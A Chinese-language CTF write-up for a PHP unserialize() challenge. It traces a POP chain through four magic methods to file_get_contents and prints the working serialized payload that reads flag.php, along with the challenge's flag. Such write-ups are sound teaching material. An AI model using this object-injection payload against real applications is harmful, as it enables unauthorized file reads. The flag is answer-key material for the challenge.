# week2do_u_like_pop

## 题目简述

入口对 GET 参数 `pop` 直接执行 `unserialize()`。程序定义的 `Apple`、`Cherry`、`Banana` 三个类包含可串联的魔术方法，最终可控制 `Banana::$source`，通过 `file_get_contents()` 读取 `flag.php`。

## 解题过程

从触发点向危险函数反推 POP 链：

~~~text
Apple::__wakeup()
  -> Cherry::__get()
  -> Apple::__invoke()
  -> Banana::__toString()
  -> file_get_contents($source)
~~~

具体调用关系是：外层 `Apple::__wakeup()` 读取 `$this->var->value`；当 `var` 为 `Cherry` 时，访问不存在的 `value` 触发 `Cherry::__get()`。后者调用 `$this->p`，令 `p` 为内层 `Apple` 即触发 `Apple::__invoke()`；它 `echo` 自身的 `var`，当该属性是 `Banana` 对象时又触发 `Banana::__toString()`。最后把 `Banana::$source` 设置为 `flag.php`。

对应序列化对象为：

~~~text
O:5:"Apple":1:{s:3:"var";O:6:"Cherry":2:{s:1:"p";O:5:"Apple":1:{s:3:"var";O:6:"Banana":2:{s:6:"source";s:8:"flag.php";s:3:"str";N;}}s:1:"o";s:8:"pop song";}}
~~~

将其 URL 编码后作为 `?pop=` 的值提交，反序列化过程会输出 `flag.php` 源码，其中包含：

```text
0xGame{do_u_1ike_R0ck'n_Roll?}
```

## 方法总结

- 核心方法：控制反序列化对象图，串联四个 PHP 魔术方法，最终进入可控路径的 `file_get_contents`。
- 识别特征：用户输入进入 `unserialize`，类中同时出现 `__wakeup`、`__get`、`__invoke`、`__toString` 和文件读取操作。
- 注意事项：序列化字符串中的类名、属性名和字符串长度必须准确；提交 GET 参数时还要进行 URL 编码，避免引号和花括号被传输层改写。
